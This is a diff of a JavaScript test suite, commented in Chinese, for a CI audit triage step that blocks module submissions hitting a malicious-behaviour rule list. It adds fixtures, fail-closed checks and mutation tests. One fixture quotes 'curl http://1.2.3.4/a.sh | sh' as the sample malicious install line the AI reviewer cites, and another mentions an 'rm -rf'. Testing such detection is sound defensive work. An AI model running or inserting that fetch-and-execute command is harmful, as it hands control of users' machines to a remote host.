@@ -14,6 +14,10 @@ import { execFileSync } from 'node:child_process';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
+// 名单成员从**真实现**里读，不在测试里抄第二份名单（同一条「判据只许有一份」）。
+// MALICE_RULE_IDS = 今天 armed 的那 11 条；CONTEXT_QUESTION_RULE_IDS = 名单外、档位仍然是 high 的
+// 那一族（root 模块的正当功能本身）—— 新轴两侧证人一边取一条，谁改了名单谁红。
+import { MALICE_RULE_IDS, CONTEXT_QUESTION_RULE_IDS } from '../audit/risk-rules.mjs';
 
 const WF = path.resolve(import.meta.dirname, '../.github/workflows/audit.yml');
 
@@ -42,17 +46,58 @@ const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'audit-triage-'));
 const SCRIPT = path.join(TMP, 'triage.cjs');
 fs.writeFileSync(SCRIPT, TRIAGE_JS, 'utf8');
 
-/** 一份扫描报告的最小形状（字段名照 scan.mjs 的 report：riskLevel / changeType / riskReasons / meta）。 */
+/**
+ * 一份扫描报告的最小形状（字段名照 scan.mjs 的 report：riskLevel / changeType / riskReasons / meta
+ * / **findings / malice**）。
+ *
+ * 后两格是 2026-10-21 换轴时补的，不是装饰：分流现在判的就是「命中没命中名单」，而那份判据住在
+ * audit/risk-rules.mjs 里、输入是 findings；报告里缺 `malice` 那一格按 fail-closed 红（§0 第 1 条
+ * 的「取严」+ 设计文档 §5「没跑成 ≠ 没命中」）。所以夹具必须与真报告同形，
+ * 否则下面每一发测的都是「一份不存在的报告」。
+ * `over.findings` / `over.malice` 只给「命中名单」与「缺读数」那几发改结论用。
+ */
+const cleanMalice = {
+  malicious: false, hits: [], basis: [],
+  reason: `未命中上架拦截名单（名单共 ${MALICE_RULE_IDS.length} 条 armed）—— 等级不再决定上不上架`,
+};
 const rep = (riskLevel, changeType, over = {}) => ({
   schema: 'module-audit/1',
   riskLevel, changeType,
   riskReasons: over.reasons || [`原因 ${riskLevel}`],
   meta: { id: over.id ?? 'demo', version: over.version ?? '1' },
+  findings: over.findings ?? [],
+  malice: over.malice ?? cleanMalice,
 });
+
+/** 名单成员：从真实现里取第一条 armed 的 id（抄一份 id 串就等于抄第二份名单）。 */
+const HIT_RULE = MALICE_RULE_IDS[0];
+/** 名单外、档位仍然 high 的那一族（§1.3：这批匹配的就是 root 模块的正当功能本身）。 */
+const OUT_RULE = CONTEXT_QUESTION_RULE_IDS[0];
+
+/**
+ * 「命中名单」那一发：findings 里真有一条名单成员，且报告自述的 malice 与之互相自证 ——
+ * 分流那道「报告说命中而按同一份 findings 重算说不命中 ⇒ 红」的对账闸要求两格同向，
+ * 只写其中一格的夹具是在测一份会被判据自己否掉的报告。
+ */
+const repHit = (riskLevel, changeType, over = {}) => {
+  const ruleId = over.ruleId ?? HIT_RULE;
+  return rep(riskLevel ?? 'high', changeType ?? 'first', {
+    ...over,
+    findings: [{ ruleId, file: 'service.sh', line: 2, severity: 'high', message: `命中 ${ruleId}` }],
+    malice: {
+      malicious: true, basis: ['static-malice-list'],
+      hits: [{ source: 'static', ruleId, file: 'service.sh', line: 2, message: `命中 ${ruleId}` }],
+      reason: `命中恶意行为链名单：${ruleId}（取严：任一命中就不上架）`,
+    },
+  });
+};
 
 /**
  * AI 那一层的产物形状（字段照 ai-review.mjs 的 finish('ok', …)）。
  * `target.report` 的 basename 必须是 `<pkg>.audit.json` —— triage 拿它钉「复核的正是这一包」。
+ * `maliceVerdict` 是 aiMalice() 的输出（ai-review.mjs:1785 对 status=ok 恒写这一格）：
+ * 名单上 AI 那一支的输入。分流读不到它就红 —— 所以夹具按真写盘形状给全，
+ * 「没有这一格」那一发用 artNoSlot() 显式造。
  */
 const aiArt = (pkg, over = {}) => ({
   schema: 'ai-review/v1',
@@ -61,8 +106,22 @@ const aiArt = (pkg, over = {}) => ({
   agree: over.agree ?? true,
   risk: over.risk === undefined ? null : over.risk,
   findings: over.findings ?? [],
+  maliceVerdict: over.maliceVerdict ?? { malicious: false, verified: [], basis: 'no-verdict' },
   ...(over.reason === undefined ? {} : { reason: over.reason }),
 });
+
+/** 造「ok 的产物里压根没有 maliceVerdict 那一格」（= 名单只跑了静态那半支的形状）。 */
+const artNoSlot = (pkg, over = {}) => {
+  const a = aiArt(pkg, over);
+  delete a.maliceVerdict;
+  return a;
+};
+
+/** AI 给出「恶意 + 引用已逐字复验」的结论（§0 第 1 条 / §6：这是它唯一的一发拒的权力）。 */
+const aiMaliceHit = (quote = 'curl http://1.2.3.4/a.sh | sh') => ({
+  malicious: true, verified: [{ file: 'install.sh', line: 7, quote }], basis: 'ai-malice-verified',
+});
+
 
 /** 一条 AI 命中（severity 是抬级的输入，message 是进 reasons 的自由文本）。 */
 const aiHit = (severity, message, over = {}) => ({
@@ -102,10 +161,11 @@ function runTriage(reports, ai, opts = {}) {
   for (const [f, v] of Object.entries(opts.rawStatus || {})) {
     fs.writeFileSync(path.join(dir, 'audit-out', f), typeof v === 'string' ? `${v}\n` : v, 'utf8');
   }
-  // 只有真需要 raiseLevel 的形态才装模块（装一份 ≈344KB，全量装会把这 30 发拖慢一档）。
-  const needsModule = Object.values(ai || {}).some((v) => (typeof v === 'string' ? v : v.status) === 'ok')
-    || Object.keys(opts.rawStatus || {}).length > 0;
-  if (opts.module !== false && needsModule) installModule(dir, opts.moduleAt || 'audit');
+  // 分流这一格现在**无条件** import audit/risk-rules.mjs（名单与处置那份判据），
+  // 所以每一发真跑都要有那一棵树 —— 旧写法只在「有 ok 状态、要拿 raiseLevel」时装模块，
+  // 那是判据还没进 YAML 时的形状。装一份 ≈600KB，全套多花的时间与「测的是不是同一份代码」
+  // 相比不是要省的那一笔。
+  if (opts.module !== false) installModule(dir, opts.moduleAt || 'audit');
   const out = path.join(dir, 'gh_output');
   fs.writeFileSync(out, '', 'utf8');
   let err = null;
@@ -221,7 +281,8 @@ const FAKE_STUB = [
   'if (p.noWrite) process.exit(p.exit || 2);',
   'fs.writeFileSync(flag("status"), p.status + "\\n");',
   'const art = Object.assign({ schema: "ai-review/v1", status: p.status,',
-  '  target: { zip: zip, report: flag("report") } }, p.artifact || {});',
+  '  target: { zip: zip, report: flag("report") },',
+  '  maliceVerdict: { malicious: false, verified: [], basis: "stub-no-verdict" } }, p.artifact || {});',
   'fs.writeFileSync(flag("out"), JSON.stringify(art));',
   'process.exit(p.status === "ok" ? 0 : 1);',
   '',
@@ -300,7 +361,13 @@ const argOf = (argv, name) => {
 
 /* --------------------------------------------------------------- 基线：单包 */
 
-test('单包 low+first → auto-approve（修完不许把干净的首次投稿一起卡住）', () => {
+// 2026-10-21 换轴后的单包矩阵（设计文档 §2 / §4 / §13.5；四条拍板原话的第 ① 条）。
+// 四格各有各的证人，哪一件事拦的不许混成一句：
+//   名单命中                   -> block          （① 取严：任一命中就不上架）
+//   名单外 + 首次收录           -> auto-approve    （§1.3：那批 high 就是 root 模块的正当功能本身）
+//   名单外 + update / unknown   -> request-review （§13 第 2 条待拍，维持转人工，不许落地时自行默认）
+//   撤销过执行类发现            -> request-review （fix8-E：换轴不许把它绕过去）
+test('单包 low+first 且名单外 → auto-approve（修完不许把干净的首次投稿一起卡住）', () => {
   const { kv, err } = runTriage({ good: rep('low', 'first') });
   assert.equal(err, null, err && err.stderr);
   assert.equal(kv.risk, 'low');
@@ -312,18 +379,51 @@ test('单包 low+first → auto-approve（修完不许把干净的首次投稿�
   assert.equal(kv.reasons, '原因 low', '单包时 reasons 不该被包名前缀污染');
 });
 
-test('单包 low+update → request-review；medium/high → block（决策矩阵原样成立）', () => {
-  assert.equal(runTriage({ a: rep('low', 'update') }).kv.action, 'request-review');
-  assert.equal(runTriage({ a: rep('medium', 'first') }).kv.action, 'block');
-  assert.equal(runTriage({ a: rep('high', 'first') }).kv.action, 'block');
+test('单包：名单外的 medium/high 不再拦上架，update / unknown 照旧转人工，命中就 block', () => {
+  // 反面的证人（名单外 ⇒ 上架）：这两发在旧轴上都是 block ⇒ 「YAML 的判据偷偷退回等级轴」
+  // 那一发变异一定红在这里（§1.3 / §2 第一轴）。
+  assert.equal(runTriage({ a: rep('medium', 'first') }).kv.action, 'auto-approve',
+    '名单外的 medium 在新模型里只是标注；按等级拦就等于把整个 root 生态一起卡死');
+  assert.equal(runTriage({ a: rep('high', 'first') }).kv.action, 'auto-approve',
+    '同上：high 不等于恶意（① 的落点）');
+  assert.equal(runTriage({ a: rep('high', 'first') }).kv.risk, 'high',
+    '换轴改的是「等级不再是判决」，不是把量出来的等级抹掉 —— 标注那一根轴照旧取最严');
+  // 正面的证人（名单命中 ⇒ 拦）。规则 id 从真名单里取，不在这里抄第二份名单。
+  assert.equal(runTriage({ a: repHit('high', 'first') }).kv.action, 'block',
+    '① 取严：命中名单就不上架');
+  assert.equal(runTriage({ a: repHit('low', 'first') }).kv.action, 'block',
+    '等级低也拦：命中就是命中，等级不参与这一格');
+  // 不是首次收录 ⇒ §13 第 2 条那一格是待拍，维持转人工（只更严不更松）。
+  assert.equal(runTriage({ a: rep('low', 'update') }).kv.action, 'request-review',
+    '「要不要给 update 另加一道」待拍，本步不许自行默认成上架');
+  assert.equal(runTriage({ a: rep('low', 'unknown') }).kv.action, 'request-review');
+  assert.equal(runTriage({ a: repHit('high', 'update') }).kv.action, 'block',
+    '命中 + 更新两个理由同时成立时，取严只剩 block，两条不许互相抵消');
+});
+
+test('fix8-E 在新轴上照旧生效：撤销过执行类发现 ⇒ 名单外也不自动放行', () => {
+  // 这一格是「换轴时最容易被顺手绕过去」的那一发：它住在 decide() 的第三参里，
+  // YAML 只要不汇 revokedBundledRefs 就会静默失效（⇒ 变异验证里「退回旧轴/丢掉第三参」都红在这里）。
+  const withRevoke = {
+    ...rep('low', 'first'),
+    revokedBundledRefs: [{ ruleId: 'EXEC_BUNDLED_FILE', file: 'service.sh', line: 12, resolvedEntry: 'bin/tool', covered: true }],
+  };
+  const { kv, err } = runTriage({ a: withRevoke });
+  assert.equal(err, null, err && err.stderr);
+  assert.equal(kv.action, 'request-review', '机器替被执行文件作过证 ⇒ 它不能同时又是自动放行的理由');
+  assert.equal(kv.needs_human_review, 'true');
+  // 反面对照：同一份报告把撤销那一格清空才谈得上自动放行（证明上面那句不是抄来的常量）。
+  assert.equal(runTriage({ a: rep('low', 'first') }).kv.action, 'auto-approve');
 });
 
 /* --------------------------------------------------------------- F16：多包取最严 */
 
-test('两包一 low 一 high → block（这就是修前会 auto-approve 的那一发）', () => {
+test('两包：一包命中名单、一包干净 → block（这就是修前会 auto-approve 的那一发）', () => {
   // 修前是 `ls -t audit-out/*.audit.json | head -n1`：只拿「时间戳最新那一份」定级。
-  // 攻击形状 = 把自己那份干净的 low+first 排在高风险那份之后写出来，整条 PR 一起被 squash 合并。
-  const { kv, err } = runTriage({ evil: rep('high', 'first'), good: rep('low', 'first') });
+  // 攻击形状 = 把自己那份干净的 low+first 排在有问题那份之后写出来，整条 PR 一起被 squash 合并。
+  // 换轴后这一格仍然成立，而且更必须成立：判据现在是「任一包命中」（① 取严），
+  // 少看一份报告 = 少看一次名单 ⇒ 被漏掉的那一包本该 block 整条 PR。
+  const { kv, err } = runTriage({ evil: repHit('high', 'first'), good: rep('low', 'first') });
   assert.equal(err, null, err && err.stderr);
   assert.equal(kv.package_count, '2');
   assert.equal(kv.risk, 'high', '等级必须取所有报告里最严的，不是取最新的一份');
@@ -333,20 +433,25 @@ test('两包一 low 一 high → block（这就是修前会 auto-approve 的那�
   assert.match(kv.reasons, /good: 原因 low/);
 });
 
-test('low+first 与 low+update 混投 → 不是 auto-approve（changeType 混合要落进人工队列）', () => {
+test('low+first 与 low+update 混投 → 不是 auto-approve（每一份都得是首次收录）', () => {
   const { kv } = runTriage({ a: rep('low', 'first'), b: rep('low', 'update') });
   assert.equal(kv.change_type, 'first+update');
   assert.equal(kv.risk, 'low');
-  assert.equal(kv.action, 'request-review', '只要不是「每一份都 low+first」就不能自动合并');
+  assert.equal(kv.action, 'request-review', '不是「每一份都首次收录」就不自动合入（§13 第 2 条待拍那一格）');
 });
 
-test('三份里最严那份排最后也照样 block（判据与文件名顺序无关）', () => {
-  const a = runTriage({ 'a-mod': rep('low', 'first'), 'z-mod': rep('medium', 'first') });
-  const b = runTriage({ 'a-mod': rep('medium', 'first'), 'z-mod': rep('low', 'first') });
+test('命中名单那份排最后也照样 block（判据与文件名顺序无关）', () => {
+  // 两包一份 low 一份「medium 且命中名单」，两个方向的文件名顺序各跑一次：
+  // 等级读数与处置都不许因为「谁排在后面」而变 —— 那是 F16 的成因，不是新轴的例外。
+  const a = runTriage({ 'a-mod': rep('low', 'first'), 'z-mod': repHit('medium', 'first') });
+  const b = runTriage({ 'a-mod': repHit('medium', 'first'), 'z-mod': rep('low', 'first') });
   assert.equal(a.kv.risk, 'medium');
   assert.equal(b.kv.risk, 'medium');
-  assert.equal(a.kv.action, 'block');
-  assert.equal(b.kv.action, 'block');
+  assert.equal(a.kv.action, 'block', '命中那份排在后面 ⇒ 仍然 block（① 任一命中就不上架）');
+  assert.equal(b.kv.action, 'block', '命中那份排在前面 ⇒ 同上：顺序不参与判据');
+  // 对照：两包都在名单外 ⇒ 两个方向都是 auto-approve。
+  // 这一发证明上面那两红是**名单**给的，不是等级或文件名顺序给的（旧轴在这里给不出 block）。
+  assert.equal(runTriage({ 'a-mod': rep('low', 'first'), 'z-mod': rep('medium', 'first') }).kv.action, 'auto-approve');
 });
 
 test('module_id 按包去重汇总（一条 PR 里几个投稿人要看得见）', () => {
@@ -358,15 +463,57 @@ test('module_id 按包去重汇总（一条 PR 里几个投稿人要看得见）
   assert.equal(kv.module_id, 'mod-a,mod-b');
 });
 
-/* --------------------------------------------------------------- 坏输入不许塌成低风险 */
+/* --------------------------------------------------------------- 坏输入不许塌成放行 */
 
-test('报告缺 riskLevel 或等级不在枚举里 → 按 high 处理，不许塌成 low 而被自动放行', () => {
+test('报告缺 riskLevel 或等级不在枚举里 → 整步红（换轴后「按 high 排」不再是护栏）', () => {
+  // 旧写法是「按 high 排 ⇒ block」，那一档护栏是**等级轴**给的。换轴之后等级不参与上不上架 ⇒
+  // 同一份读不出等级的报告只要「名单没命中」就会被自动放行。所以这一格改成与本步其余闸同方向：红。
+  // 与设计文档 §5 同一条口径：读不懂 ≠ 没命中（①取严 + §5「没跑成」与「没看全」要分开）。
   const missing = { ...rep('low', 'first') };
   delete missing.riskLevel;
-  assert.equal(runTriage({ a: missing }).kv.action, 'block', '读不懂的报告不是「低风险」');
-  assert.equal(runTriage({ a: missing, b: rep('low', 'first') }).kv.action, 'block');
-  assert.equal(runTriage({ a: rep('catastrophic', 'first') }).kv.action, 'block');
-  assert.equal(runTriage({ a: rep('catastrophic', 'first') }).kv.risk, 'high');
+  const single = runTriage({ a: missing });
+  assert.notEqual(single.err, null, '读不懂的报告必须是红，不许按「名单没命中」继续走');
+  assertFailClosed(single.kv);
+  const mixed = runTriage({ a: missing, b: rep('low', 'first') });
+  assert.notEqual(mixed.err, null, '一份坏报告就整步红 —— 这条方向与旧轴一致，一个字没放宽');
+  assertFailClosed(mixed.kv);
+  const bogus = runTriage({ a: rep('catastrophic', 'first') });
+  assert.notEqual(bogus.err, null);
+  assertFailClosed(bogus.kv);
+  assert.equal(bogus.kv.risk, '', '没有等级就留空：填 high 是替一个没量过的等级说话（本步那 10 键的旧口径）');
+});
+
+test('报告缺 malice 那一格 → 整步红，不许默认成「名单没命中」放过去', () => {
+  // ① 的落点，也是这一轮换轴**唯一真正新增的失效形态**：报告不是带名单判据的扫描器写的
+  // （scan 与 YAML 分两发部署时就是这形状），把它读成「未命中」等于把整条闸交给故障。
+  const noSlotMiss = { ...rep('low', 'first') };
+  delete noSlotMiss.malice;
+  const { kv, err, stderr } = runTriage({ a: noSlotMiss });
+  assert.notEqual(err, null, '缺 malice = 判据没收到东西，红');
+  // 钉**这道闸自己那句话**，不钉「红」这个结果：把守卫摘掉时这份报告照样会 TypeError 红一次，
+  // 但那句「没有 malice 那一格」出不来 ⇒ 只有钉串才分得开「守卫在」与「碰巧崩了」。
+  assert.match(stderr, /没有 malice 那一格/, '红的说法必须是「缺读数」，不是「读这份报告时崩了」');
+  assertFailClosed(kv, '缺读数那一发写出的判据要与其余 fail-closed 逐字同形：');
+  assert.equal(kv.risk, '', 'risk 留空：这一轮没有可采信的等级');
+  // 形状坏了同样红（写了那一格但 malicious 不是布尔 = 读不出它到底有没有表态）
+  const badShape = runTriage({ a: { ...rep('low', 'first'), malice: { reason: '判据没跑' } } });
+  assert.notEqual(badShape.err, null);
+  assertFailClosed(badShape.kv);
+  // 反面对照：补上「未命中」那一格 ⇒ 同一份报告立刻能跑绿（证明上面那两红断的是这一格，不是别处）
+  assert.equal(runTriage({ a: rep('low', 'first') }).kv.action, 'auto-approve');
+});
+
+test('报告自述命中名单、findings 却撑不住它 → 红（两格对不上就是判据收到的东西不全）', () => {
+  // 这一发钉的是分流那道对账闸：malice 说命中而按同一份 findings 重算说不命中 ⇒ 红。
+  // 方向只有一个：更不放行。它把「报告里那一格可以凭空写」这条路堵掉。
+  const drift = rep('high', 'first', {
+    findings: [],
+    malice: { malicious: true, hits: [{ source: 'static', ruleId: HIT_RULE }], basis: ['static-malice-list'], reason: '命中恶意行为链名单' },
+  });
+  const { kv, err, stderr } = runTriage({ a: drift });
+  assert.notEqual(err, null, '自述命中而 findings 撑不住 ⇒ 不许按任何一种读数放行');
+  assert.match(stderr, /对不上/);
+  assertFailClosed(kv);
 });
 
 test('audit-out 里一份报告都没有 → 这一步直接失败，并留下 fail-closed 判据（不是「什么都不留」）', () => {
@@ -398,12 +545,16 @@ test('有一份报告坏了 → 整步失败，不许「跳过坏的那份、用
 
 // 这条原本是 `llm.json agree:false → 抬等级`。T6.1 把 llm.json 换成了 ai-<pkg>.status，
 // 按工单 §1 第 2 步的要求**改写成同形用例而不是删掉** —— 它是「AI 参与定级」唯一的机器检查。
+// 2026-10-21 换轴给它补了第二格：抬级现在落在**标注轴**上（等级照旧取最严、照旧写进 risk），
+// 而 AI 在**判定轴**上唯一的一发拒的权力是 maliceVerdict（下面那发证人）。两条不许互相顶替。
 test('ok 的三发：agree:false 且更严 → 抬等级；同意或不更严时不动静态结论', () => {
   const escalate = runTriage({ 'a.zip': rep('low', 'first') }, {
     'a.zip': { status: 'ok', ...aiArt('a.zip', { agree: false, risk: 'high', findings: [aiHit('high', '模型看到了别的')] }) },
   });
-  assert.equal(escalate.kv.risk, 'high');
-  assert.equal(escalate.kv.action, 'block');
+  assert.equal(escalate.kv.risk, 'high', 'AI 抬完的等级必须进 risk 那一格（标注轴照旧取最严）');
+  assert.equal(escalate.kv.action, 'auto-approve',
+    '抬级本身不再拦上架：这条链上等级不是判决（§2 两轴 + ①「名单才决定上不上架」）。'
+    + '这一格如果重新变成 block，说明有人把判据退回等级轴了 —— 变异 M1 就是打在这里');
   assert.match(escalate.kv.ai_note, /不同意/);
   assert.match(escalate.kv.reasons, /AI 复核：模型看到了别的/);
 
@@ -423,8 +574,11 @@ test('ok 的三发：agree:false 且更严 → 抬等级；同意或不更严时
 test('变异哨兵：把判据退回「只取最新那一份报告」，多包混投就会重新被自动放行', () => {
   // 这条不测新代码，它测的是上面那批断言**有没有在测东西**。
   // 做法：拿同一份内联脚本，只把「收集报告清单」那一行退回旧语义（按 mtime 取最新一份），
-  // 然后喂同一个「一份 high 写得早、一份 low+first 写得晚」的 PR。
+  // 然后喂同一个「一份命中名单写得早、一份干净 low+first 写得晚」的 PR。
   // 旧语义在这里必须给出 auto-approve —— 给出了，才证明 F16 是真的洞、上面的 block 断言不是空跑。
+  // 2026-10-21 换轴时这一发的夹具从「一份 high」改成了「一份命中名单」：等级已经不参与判决，
+  // 再喂一份名单外的高风险包，新旧两种语义都会给出 auto-approve ⇒ 这发哨兵就成空枪（它测的是
+  // 「断言有没有在测东西」，空枪比红更危险）。替换的是输入形状，不是它的牙。
   const mutated = TRIAGE_JS.replace(
     /^names=fs\.readdirSync[^\n]*/m,
     'names=(()=>{const all=fs.readdirSync(dir).filter((f)=>f.endsWith(".audit.json"));'
@@ -436,12 +590,12 @@ test('变异哨兵：把判据退回「只取最新那一份报告」，多包�
   fs.writeFileSync(old, mutated, 'utf8');
 
   const { kv } = runTriage(
-    { evil: rep('high', 'first'), good: rep('low', 'first') },
+    { evil: repHit('high', 'first'), good: rep('low', 'first') },
     undefined,
     { script: old, mtime: { evil: 1_000_000, good: 2_000_000 } }, // good 是「最新那份」
   );
   assert.equal(kv.package_count, '1', '旧语义只看得到一份报告');
-  assert.equal(kv.risk, 'low', '那份 high 根本没参与定级');
+  assert.equal(kv.risk, 'low', '那份命中名单的读数根本没参与定级');
   assert.equal(kv.action, 'auto-approve', '旧语义下这条混投 PR 会被自动合并 —— 这就是 F16');
 });
 
@@ -480,6 +634,69 @@ test('变异哨兵：把红那一发的处置写成 auto-approve，就是给一�
   assert.equal(kv.needs_human_review, 'false');
   // 这三格正是 publish 作业的门票（它的 if 认 found 与 action 两个 output）与标签步会真打上去的颜色
   // ⇒ assertFailClosed 里那三条 equal 是挡住「通道坏了被渲染成已放行」的唯一一道牙。
+});
+
+/* ================== 变异哨兵（2026-10-21 换轴）：新轴那批发反证人必须真的在测东西 ==================
+ * 上面几发证明的是 fail-closed 与多包聚合；下面三发证明的是**轴本身**：
+ *   M1 判据退回旧轴（等级当判决）      M2 「任一命中」被写成「全部命中」      M3 「缺 malice 读数」被兜成「没命中」。
+ * 三发都按这条链的既有起法：拿同一份内联脚本改一处，喂真实形状的报告，要求它**给出错的那一个结论** ——
+ * 给不出错结论，就说明对应那几发断言是空枪。设计文档 §12 那条「每阶段独立可停」也靠这个形状才量得到。
+ */
+
+/** 把内联脚本按一处字面量改出变异体，落到临时文件并返回路径（替换点漂了就先红，不许静默空跑）。 */
+function mutatedScript(name, from, to) {
+  assert.ok(TRIAGE_JS.includes(from),
+    `变异哨兵 ${name} 的替换点漂了（找不到 ${JSON.stringify(from.slice(0, 48))}）—— 更新它，别删掉它`);
+  const p = path.join(TMP, `triage-${name}.cjs`);
+  fs.writeFileSync(p, TRIAGE_JS.replace(from, to), 'utf8');
+  return p;
+}
+
+test('变异哨兵 M1：把 decide() 的第四参与第三参摘掉（= 退回旧轴），名单外的高风险包重新被拦', () => {
+  const s = mutatedScript('old-axis', 'decide(risk,changeType,coverage,malice)', 'decide(risk,changeType)');
+  // 旧轴在这里**必须**给出 block：给出了，才证明「名单外 high ⇒ auto-approve」那几发断言（① / §1.3）
+  // 不是恰好绿，而是真的在测新轴。
+  assert.equal(runTriage({ a: rep('high', 'first') }, undefined, { script: s }).kv.action, 'block',
+    '退回旧轴却不红 ⇒ 新轴的正面证人形同虚设（换轴在线上等于没生效，就是本轮开头那一格）');
+  assert.equal(runTriage({ a: repHit('high', 'first') }, undefined, { script: s }).kv.action, 'block',
+    '命中那一发在旧轴上也是 block ⇒ 这一格分不出轴；能分开的只有上面那发与下面 fix8-E 那发');
+  // 同一次摘掉第三参（coverage）顺手把 fix8-E 绕过去了 —— 那一格必须翻成放行才算有牙。
+  assert.equal(runTriage({ a: { ...rep('low', 'first'), revokedBundledRefs: [{ resolvedEntry: 'bin/tool' }] } },
+    undefined, { script: s }).kv.action, 'auto-approve',
+    'fix8-E 在新轴上是靠 YAML 把 revokedBundledRefs 汇进第三参才生效的：这一发就是那条接线的证人');
+});
+
+test('变异哨兵 M2：把「任一命中」写成「全部命中」，混投 PR 里干净那一包就把整条放出去', () => {
+  const s = mutatedScript('all-hit', 'const malice=hitPkgs.length ? {',
+    'const malice=(malices.length>0&&malices.every((x)=>x.m.malicious)) ? {');
+  const { kv } = runTriage({ evil: repHit('high', 'first'), good: rep('low', 'first') }, undefined, { script: s });
+  assert.equal(kv.action, 'auto-approve',
+    '这一发必须翻成放行，才证明上面那发 block 断的是「任一」而不是「全部」（① 取严那条原话）');
+});
+
+test('变异哨兵 M3：把「报告缺 malice 那一格」兜成「没命中」，坏报告就变成一张门票', () => {
+  const s = mutatedScript('fail-open-malice', 'const maliceOf=(x)=>{',
+    'const maliceOf=(x)=>{ if(!x.r.malice) return { malicious:false, hits:[], basis:[], reason:"变异：缺读数按没命中" };');
+  const noSlot = { ...rep('low', 'first') };
+  delete noSlot.malice;
+  const { kv, err } = runTriage({ a: noSlot }, undefined, { script: s });
+  assert.equal(err, null, '这一支变异之后不再红：红没了，才说明「缺读数 ⇒ 红」那发断言有牙');
+  assert.equal(kv.action, 'auto-approve',
+    '把「判据没收到东西」默认成「没命中」就是把这道闸交给故障 —— 设计文档 §5 分开的正是这两件事');
+});
+
+test('变异哨兵 M4：把「ok 的产物缺 maliceVerdict」那道闸摘掉，名单就只剩静态那半支', () => {
+  // M3 管报告那一格，这一分管 AI 那一支：两支合起来才是 §0 第 1 条定案的名单（静态 ∪ AI 恶意结论）。
+  // 摘掉守卫后 artNoSlot() 那发（真 v1 产物就是这形状）会一路走到放行 —— 绿叉比红叉贵：
+  // 没人会去查一条绿的 required check，而线上跑的名单已经比定案的窄了一条支。
+  const s = mutatedScript('fail-open-ai-slot',
+    'if (!v || typeof v!=="object" || Array.isArray(v) || typeof v.malicious!=="boolean") {',
+    'if (false && (!v || typeof v!=="object" || Array.isArray(v) || typeof v.malicious!=="boolean")) {');
+  const { kv, err } = runTriage({ 'demo.zip': rep('low', 'first') }, {
+    'demo.zip': { status: 'ok', artifact: artNoSlot('demo.zip', { agree: true }) },
+  }, { script: s });
+  assert.equal(err, null, '摘掉这道闸它就绿了 ⇒ 「AI 那一支没接到名单上」这件事在线上无人可见');
+  assert.equal(kv.action, 'auto-approve');
 });
 
 /* --------------------------------------------------------------- 旧形态不许回来 */
@@ -694,29 +911,64 @@ test('矩阵·over-budget：exit 1，那句含「没看全」，绝不含「同�
   assert.equal(kv.change_type, 'first');
 });
 
-test('矩阵·ok+raise：静态 low+first、模型 high → action 不再是 auto-approve（整层的存在理由）', () => {
-  const { kv, err } = runTriage({ 'demo.zip': rep('low', 'first') }, {
+test('矩阵·ok+raise：抬级只进标注那一格；AI 要拦得住得靠 maliceVerdict（判定轴上那一发拒的权力）', () => {
+  // §0 第 1 条：名单 = 静态 ∪ AI 恶意结论；§2 保留的不变量：AI 只有加（拒）的权力。
+  // 换轴之后 raiseLevel 那一支落在**标注轴**上（等级照旧进 risk、照旧进评论），
+  // 判定轴上 AI 唯一的发言权是 maliceVerdict —— 两件事各有一发证人，不许互相顶替。
+  const raised = runTriage({ 'demo.zip': rep('low', 'first') }, {
     'demo.zip': { status: 'ok', ...aiArt('demo.zip', { agree: false, risk: 'high', findings: [aiHit('high', 'install.sh 里那条 rm -rf')] }) },
   });
-  assert.equal(err, null, err && err.stderr);
-  assert.equal(kv.risk, 'high', 'AI 的结论必须参与定级，只进文案就是装饰（计划 §4 F1）');
-  assert.notEqual(kv.action, 'auto-approve', '这一条变了，整层的承诺就没了');
-  assert.equal(kv.action, 'block');
-  assert.equal(kv.needs_human_review, 'true');
-  assert.match(kv.ai_note, /不同意静态结论/);
-  assert.match(kv.ai_note, /high/);
+  assert.equal(raised.err, null, raised.err && raised.err.stderr);
+  assert.equal(raised.kv.risk, 'high', 'AI 抬完的等级必须参与 risk，只进文案就是装饰（计划 §4 F1）');
+  assert.equal(raised.kv.action, 'auto-approve',
+    '等级不再决定上不上架（§2 / ①）：这一格重新变成 block 就是 YAML 的判据偷偷退回旧轴 —— 变异 M1 红在这里');
+  assert.match(raised.kv.ai_note, /不同意静态结论/);
+  assert.match(raised.kv.ai_note, /high/);
+
+  // 判定轴的正面证人：静态干净 + AI 恶意且引用已逐字复验 ⇒ block。
+  const byAi = runTriage({ 'demo.zip': rep('low', 'first') }, {
+    'demo.zip': { status: 'ok', ...aiArt('demo.zip', { agree: true, maliceVerdict: aiMaliceHit() }) },
+  });
+  assert.equal(byAi.err, null, byAi.err && byAi.err.stderr);
+  assert.equal(byAi.kv.action, 'block',
+    'AI 那一支没接到判定轴上 ⇒ ∪ 只剩静态那半支，跑的是比定案更窄的名单');
+  assert.equal(byAi.kv.needs_human_review, 'true');
+
+  // 反面：AI 说了恶意但引用复验不过 ⇒ 不采信、不拦（③ 那条「逐字定位到」的门槛同样管这一格）。
+  const unverified = runTriage({ 'demo.zip': rep('low', 'first') }, {
+    'demo.zip': { status: 'ok', ...aiArt('demo.zip', {
+      maliceVerdict: { malicious: true, verified: [], basis: 'ai-malice-unverified-not-adopted' } }) },
+  });
+  assert.equal(unverified.kv.action, 'auto-approve',
+    '没在送出去的原文里逐字复验过的恶意宣称如果拿到了拒的权力，③ 那道门槛就废了');
+
+  // AI 的「不是」不许洗掉静态那一格 —— 它只有加的权力（§2）。
+  const staticHit = runTriage({ 'demo.zip': repHit('high', 'first') }, {
+    'demo.zip': { status: 'ok', ...aiArt('demo.zip', { agree: true, maliceVerdict: { malicious: false, verified: [], basis: 'ai-declared-not-malicious' } }) },
+  });
+  assert.equal(staticHit.kv.action, 'block',
+    'AI 说不是就把静态命中洗掉了 ⇒ 它拿到了放的权力，违反 §0 第 1 条那句「两边都只有拒的权力」');
+
+  // ok 的产物里压根没有 maliceVerdict 那一格 ⇒ 红（这一发跑的是只含静态那半支的名单，方向是放宽）。
+  const noSlot = runTriage({ 'demo.zip': rep('low', 'first') }, {
+    'demo.zip': { status: 'ok', artifact: artNoSlot('demo.zip', { agree: true }) },
+  });
+  assert.notEqual(noSlot.err, null, '状态 ok 却没有那一格 = 判据只跑了一半，红');
+  assert.match(noSlot.stderr, /maliceVerdict/);
+  assertFailClosed(noSlot.kv, '「AI 那一支没有读数」与「AI 说不是」是两件事，前者的方向是红：');
 });
 
 test('矩阵·ok + agree:false 但抬不动：静态已是 high，文案不许声称「同意静态结论」', () => {
